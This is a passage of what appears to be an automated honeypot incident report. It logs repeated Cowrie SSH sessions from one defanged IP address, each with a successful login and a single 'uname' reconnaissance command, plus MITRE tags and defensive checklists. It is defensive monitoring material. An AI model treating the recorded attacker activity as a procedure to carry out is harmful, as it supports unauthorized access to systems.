| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:46 |
| **Last Seen** | 2026-06-25 13:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:46:41` | `cowrie.session.connect` |
| `2026-06-25 13:46:41` | `cowrie.client.version` |
| `2026-06-25 13:46:41` | `cowrie.client.kex` |
| `2026-06-25 13:46:42` | `cowrie.login.success` |
| `2026-06-25 13:46:43` | `cowrie.session.params` |
| `2026-06-25 13:46:43` | `cowrie.command.input` |
| `2026-06-25 13:46:43` | `cowrie.log.closed` |
| `2026-06-25 13:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d8623953ab4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:47 |
| **Last Seen** | 2026-06-25 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:47:49` | `cowrie.session.connect` |
| `2026-06-25 13:47:49` | `cowrie.client.version` |
| `2026-06-25 13:47:49` | `cowrie.client.kex` |
| `2026-06-25 13:47:49` | `cowrie.login.success` |
| `2026-06-25 13:47:50` | `cowrie.session.params` |
| `2026-06-25 13:47:50` | `cowrie.command.input` |
| `2026-06-25 13:47:50` | `cowrie.log.closed` |
| `2026-06-25 13:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eed22403c822

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:48 |
| **Last Seen** | 2026-06-25 13:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:48:56` | `cowrie.session.connect` |
| `2026-06-25 13:48:56` | `cowrie.client.version` |
| `2026-06-25 13:48:56` | `cowrie.client.kex` |
| `2026-06-25 13:48:56` | `cowrie.login.success` |
| `2026-06-25 13:48:57` | `cowrie.session.params` |
| `2026-06-25 13:48:57` | `cowrie.command.input` |
| `2026-06-25 13:48:57` | `cowrie.log.closed` |
| `2026-06-25 13:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a9a2bf447e9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:50 |
| **Last Seen** | 2026-06-25 13:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:50:06` | `cowrie.session.connect` |
| `2026-06-25 13:50:06` | `cowrie.client.version` |
| `2026-06-25 13:50:06` | `cowrie.client.kex` |
| `2026-06-25 13:50:06` | `cowrie.login.success` |
| `2026-06-25 13:50:07` | `cowrie.session.params` |
| `2026-06-25 13:50:07` | `cowrie.command.input` |
| `2026-06-25 13:50:07` | `cowrie.log.closed` |
| `2026-06-25 13:50:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3444749a7de

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:51 |
| **Last Seen** | 2026-06-25 13:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:51:12` | `cowrie.session.connect` |
| `2026-06-25 13:51:12` | `cowrie.client.version` |
| `2026-06-25 13:51:12` | `cowrie.client.kex` |
| `2026-06-25 13:51:12` | `cowrie.login.success` |
| `2026-06-25 13:51:13` | `cowrie.session.params` |
| `2026-06-25 13:51:13` | `cowrie.command.input` |
| `2026-06-25 13:51:13` | `cowrie.log.closed` |
| `2026-06-25 13:51:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e74f7235e4f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:52 |
| **Last Seen** | 2026-06-25 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:52:18` | `cowrie.session.connect` |
| `2026-06-25 13:52:18` | `cowrie.client.version` |
| `2026-06-25 13:52:18` | `cowrie.client.kex` |
| `2026-06-25 13:52:18` | `cowrie.login.success` |
| `2026-06-25 13:52:19` | `cowrie.session.params` |
| `2026-06-25 13:52:19` | `cowrie.command.input` |
| `2026-06-25 13:52:19` | `cowrie.log.closed` |
| `2026-06-25 13:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-383848e1322e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:53 |
| **Last Seen** | 2026-06-25 13:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:53:26` | `cowrie.session.connect` |
| `2026-06-25 13:53:26` | `cowrie.client.version` |
| `2026-06-25 13:53:26` | `cowrie.client.kex` |
| `2026-06-25 13:53:26` | `cowrie.login.success` |
| `2026-06-25 13:53:27` | `cowrie.session.params` |
| `2026-06-25 13:53:27` | `cowrie.command.input` |
| `2026-06-25 13:53:27` | `cowrie.log.closed` |
| `2026-06-25 13:53:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8928fceb1f6a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:54 |
| **Last Seen** | 2026-06-25 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:54:38` | `cowrie.session.connect` |
| `2026-06-25 13:54:38` | `cowrie.client.version` |
| `2026-06-25 13:54:38` | `cowrie.client.kex` |
| `2026-06-25 13:54:38` | `cowrie.login.success` |
| `2026-06-25 13:54:39` | `cowrie.session.params` |
| `2026-06-25 13:54:39` | `cowrie.command.input` |
| `2026-06-25 13:54:39` | `cowrie.log.closed` |
| `2026-06-25 13:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-006c288f6b41

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:55 |
| **Last Seen** | 2026-06-25 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:55:50` | `cowrie.session.connect` |
| `2026-06-25 13:55:50` | `cowrie.client.version` |
| `2026-06-25 13:55:50` | `cowrie.client.kex` |
| `2026-06-25 13:55:51` | `cowrie.login.success` |
| `2026-06-25 13:55:51` | `cowrie.session.params` |
| `2026-06-25 13:55:51` | `cowrie.command.input` |
| `2026-06-25 13:55:52` | `cowrie.log.closed` |
| `2026-06-25 13:55:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea0bcd5d9b64

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:56 |
| **Last Seen** | 2026-06-25 13:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:56:56` | `cowrie.session.connect` |
| `2026-06-25 13:56:56` | `cowrie.client.version` |
| `2026-06-25 13:56:56` | `cowrie.client.kex` |
| `2026-06-25 13:56:57` | `cowrie.login.success` |
| `2026-06-25 13:56:58` | `cowrie.session.params` |
| `2026-06-25 13:56:58` | `cowrie.command.input` |
| `2026-06-25 13:56:58` | `cowrie.log.closed` |
| `2026-06-25 13:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-990871e4eb4f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:58 |
| **Last Seen** | 2026-06-25 13:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:58:01` | `cowrie.session.connect` |
| `2026-06-25 13:58:01` | `cowrie.client.version` |
| `2026-06-25 13:58:01` | `cowrie.client.kex` |
| `2026-06-25 13:58:02` | `cowrie.login.success` |
| `2026-06-25 13:58:03` | `cowrie.session.params` |
| `2026-06-25 13:58:03` | `cowrie.command.input` |
| `2026-06-25 13:58:03` | `cowrie.log.closed` |
| `2026-06-25 13:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f72c29010d3b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:59 |
| **Last Seen** | 2026-06-25 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:59:05` | `cowrie.session.connect` |
| `2026-06-25 13:59:05` | `cowrie.client.version` |
| `2026-06-25 13:59:05` | `cowrie.client.kex` |
| `2026-06-25 13:59:06` | `cowrie.login.success` |
| `2026-06-25 13:59:07` | `cowrie.session.params` |
| `2026-06-25 13:59:07` | `cowrie.command.input` |
| `2026-06-25 13:59:07` | `cowrie.log.closed` |
| `2026-06-25 13:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1153e0c9ffb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:00 |
| **Last Seen** | 2026-06-25 14:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:00:12` | `cowrie.session.connect` |
| `2026-06-25 14:00:12` | `cowrie.client.version` |
| `2026-06-25 14:00:12` | `cowrie.client.kex` |
| `2026-06-25 14:00:13` | `cowrie.login.success` |
| `2026-06-25 14:00:13` | `cowrie.session.params` |
| `2026-06-25 14:00:13` | `cowrie.command.input` |
| `2026-06-25 14:00:13` | `cowrie.log.closed` |
| `2026-06-25 14:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0f00e703583

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:00 |
| **Last Seen** | 2026-06-25 14:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:00:57` | `cowrie.session.connect` |
| `2026-06-25 14:00:57` | `cowrie.client.version` |
| `2026-06-25 14:00:57` | `cowrie.client.kex` |
| `2026-06-25 14:00:57` | `cowrie.login.success` |
| `2026-06-25 14:00:58` | `cowrie.session.params` |
| `2026-06-25 14:00:58` | `cowrie.command.input` |
| `2026-06-25 14:00:58` | `cowrie.log.closed` |
| `2026-06-25 14:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a66f8a03601

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:01 |
| **Last Seen** | 2026-06-25 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:01:44` | `cowrie.session.connect` |
| `2026-06-25 14:01:44` | `cowrie.client.version` |
| `2026-06-25 14:01:44` | `cowrie.client.kex` |
| `2026-06-25 14:01:45` | `cowrie.login.success` |
| `2026-06-25 14:01:45` | `cowrie.session.params` |
| `2026-06-25 14:01:45` | `cowrie.command.input` |
| `2026-06-25 14:01:45` | `cowrie.log.closed` |
| `2026-06-25 14:01:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eb72ad0abf0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:02 |
| **Last Seen** | 2026-06-25 14:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:02:30` | `cowrie.session.connect` |
| `2026-06-25 14:02:30` | `cowrie.client.version` |
| `2026-06-25 14:02:30` | `cowrie.client.kex` |
| `2026-06-25 14:02:30` | `cowrie.login.success` |
| `2026-06-25 14:02:31` | `cowrie.session.params` |
| `2026-06-25 14:02:31` | `cowrie.command.input` |
| `2026-06-25 14:02:31` | `cowrie.log.closed` |
| `2026-06-25 14:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b24fd00d01de

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:03 |
| **Last Seen** | 2026-06-25 14:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:03:17` | `cowrie.session.connect` |
| `2026-06-25 14:03:17` | `cowrie.client.version` |
| `2026-06-25 14:03:17` | `cowrie.client.kex` |
| `2026-06-25 14:03:17` | `cowrie.login.success` |
| `2026-06-25 14:03:18` | `cowrie.session.params` |
| `2026-06-25 14:03:18` | `cowrie.command.input` |
| `2026-06-25 14:03:18` | `cowrie.log.closed` |
| `2026-06-25 14:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a532d976479a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:04 |
| **Last Seen** | 2026-06-25 14:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:04:05` | `cowrie.session.connect` |
| `2026-06-25 14:04:05` | `cowrie.client.version` |
| `2026-06-25 14:04:05` | `cowrie.client.kex` |
| `2026-06-25 14:04:06` | `cowrie.login.success` |
| `2026-06-25 14:04:06` | `cowrie.session.params` |
| `2026-06-25 14:04:06` | `cowrie.command.input` |
| `2026-06-25 14:04:07` | `cowrie.log.closed` |
| `2026-06-25 14:04:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7ef245a5d4b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:04 |
| **Last Seen** | 2026-06-25 14:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:04:49` | `cowrie.session.connect` |
| `2026-06-25 14:04:49` | `cowrie.client.version` |
| `2026-06-25 14:04:49` | `cowrie.client.kex` |
| `2026-06-25 14:04:49` | `cowrie.login.success` |
| `2026-06-25 14:04:50` | `cowrie.session.params` |
| `2026-06-25 14:04:50` | `cowrie.command.input` |
| `2026-06-25 14:04:50` | `cowrie.log.closed` |
| `2026-06-25 14:04:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdd8b8bde319

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:05 |
| **Last Seen** | 2026-06-25 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:05:35` | `cowrie.session.connect` |
| `2026-06-25 14:05:35` | `cowrie.client.version` |
| `2026-06-25 14:05:35` | `cowrie.client.kex` |
| `2026-06-25 14:05:35` | `cowrie.login.success` |
| `2026-06-25 14:05:36` | `cowrie.session.params` |
| `2026-06-25 14:05:36` | `cowrie.command.input` |
| `2026-06-25 14:05:36` | `cowrie.log.closed` |
| `2026-06-25 14:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a2ac5c2e437

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:06 |
| **Last Seen** | 2026-06-25 14:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:06:22` | `cowrie.session.connect` |
| `2026-06-25 14:06:22` | `cowrie.client.version` |
| `2026-06-25 14:06:22` | `cowrie.client.kex` |
| `2026-06-25 14:06:22` | `cowrie.login.success` |
| `2026-06-25 14:06:23` | `cowrie.session.params` |
| `2026-06-25 14:06:23` | `cowrie.command.input` |
| `2026-06-25 14:06:23` | `cowrie.log.closed` |
| `2026-06-25 14:06:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33e369aff3c6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:07 |
| **Last Seen** | 2026-06-25 14:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:07:08` | `cowrie.session.connect` |
| `2026-06-25 14:07:08` | `cowrie.client.version` |
| `2026-06-25 14:07:08` | `cowrie.client.kex` |
| `2026-06-25 14:07:08` | `cowrie.login.success` |
| `2026-06-25 14:07:09` | `cowrie.session.params` |
| `2026-06-25 14:07:09` | `cowrie.command.input` |
| `2026-06-25 14:07:09` | `cowrie.log.closed` |
| `2026-06-25 14:07:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-244be5a41946

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:07 |
| **Last Seen** | 2026-06-25 14:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:07:57` | `cowrie.session.connect` |
| `2026-06-25 14:07:57` | `cowrie.client.version` |
| `2026-06-25 14:07:57` | `cowrie.client.kex` |
| `2026-06-25 14:07:58` | `cowrie.login.success` |
| `2026-06-25 14:07:59` | `cowrie.session.params` |
| `2026-06-25 14:07:59` | `cowrie.command.input` |
| `2026-06-25 14:07:59` | `cowrie.log.closed` |
| `2026-06-25 14:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5830b488a456

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:08 |
| **Last Seen** | 2026-06-25 14:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:08:44` | `cowrie.session.connect` |
| `2026-06-25 14:08:44` | `cowrie.client.version` |
| `2026-06-25 14:08:44` | `cowrie.client.kex` |
| `2026-06-25 14:08:45` | `cowrie.login.success` |
| `2026-06-25 14:08:45` | `cowrie.session.params` |
| `2026-06-25 14:08:45` | `cowrie.command.input` |
| `2026-06-25 14:08:45` | `cowrie.log.closed` |
| `2026-06-25 14:08:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b494939d8d2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:09 |
| **Last Seen** | 2026-06-25 14:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:09:30` | `cowrie.session.connect` |
| `2026-06-25 14:09:30` | `cowrie.client.version` |
| `2026-06-25 14:09:30` | `cowrie.client.kex` |
| `2026-06-25 14:09:30` | `cowrie.login.success` |
| `2026-06-25 14:09:31` | `cowrie.session.params` |
| `2026-06-25 14:09:31` | `cowrie.command.input` |
| `2026-06-25 14:09:31` | `cowrie.log.closed` |
| `2026-06-25 14:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0af0678fd3c8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:10 |
| **Last Seen** | 2026-06-25 14:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:10:17` | `cowrie.session.connect` |
| `2026-06-25 14:10:17` | `cowrie.client.version` |
| `2026-06-25 14:10:18` | `cowrie.client.kex` |
| `2026-06-25 14:10:18` | `cowrie.login.success` |
| `2026-06-25 14:10:19` | `cowrie.session.params` |
| `2026-06-25 14:10:19` | `cowrie.command.input` |
| `2026-06-25 14:10:19` | `cowrie.log.closed` |
